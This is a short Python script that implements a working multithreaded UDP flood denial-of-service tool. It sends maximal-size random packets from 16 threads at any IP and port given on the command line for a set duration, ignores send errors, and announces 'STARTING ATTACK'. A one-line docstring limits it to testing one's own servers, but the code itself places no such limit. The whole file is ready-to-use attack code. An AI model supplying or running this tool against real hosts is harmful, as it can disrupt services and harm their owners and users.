#!/usr/bin/env python
"""
Simple UDP Flood - Direct Implementation
For testing your own servers only
"""

import socket
import sys
import time
import random
import string
import threading

# Generate a single large payload once to reuse
def generate_payload(size=65507):  # Max UDP size
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size)).encode('utf-8')

# Global payload to avoid regenerating for each packet
PAYLOAD = generate_payload()

def flood_thread(target_ip, port, duration, thread_id=0):
    """Simple flooding thread with minimal overhead"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507 * 1024)  # Larger buffer
    
    end_time = time.time() + duration
    packets_sent = 0
    start_time = time.time()
    
    print("[+] Thread %d started attacking %s:%d" % (thread_id, target_ip, port))
    
    # Simple loop - send as fast as possible
    try:
        while time.time() < end_time:
            try:
                sock.sendto(PAYLOAD, (target_ip, port))
                packets_sent += 1
                
                # Only print from main thread occasionally
                if thread_id == 0 and packets_sent % 50000 == 0:
                    elapsed = time.time() - start_time
                    print("[+] Sent %d packets (%.2f packets/sec)" % 
                         (packets_sent, packets_sent/elapsed))
            except:
                # Just continue if any error occurs
                continue
                
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
        elapsed = time.time() - start_time
        print("[+] Thread %d finished - sent %d packets in %.2f seconds" % 
             (thread_id, packets_sent, elapsed))

def main():
    if len(sys.argv) != 4:
        print("Usage: python simple-flood.py <IP> <PORT> <SECONDS>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    # Automatically determine thread count - use more threads for maximum impact
    thread_count = 16  # Fixed high number of threads
    
    print("=" * 60)
    print("STARTING ATTACK")
    print("Target: %s:%d" % (target_ip, port))
    print("Duration: %d seconds" % duration)
    print("Threads: %d" % thread_count)
    print("=" * 60)
    
    # Start threads
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=flood_thread, args=(target_ip, port, duration, i))
        threads.append(t)
        t.start()
        # Small delay to stagger thread starts
        time.sleep(0.1)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    print("=" * 60)
    print("ATTACK COMPLETED")
    print("=" * 60)

if __name__ == "__main__":
    main()
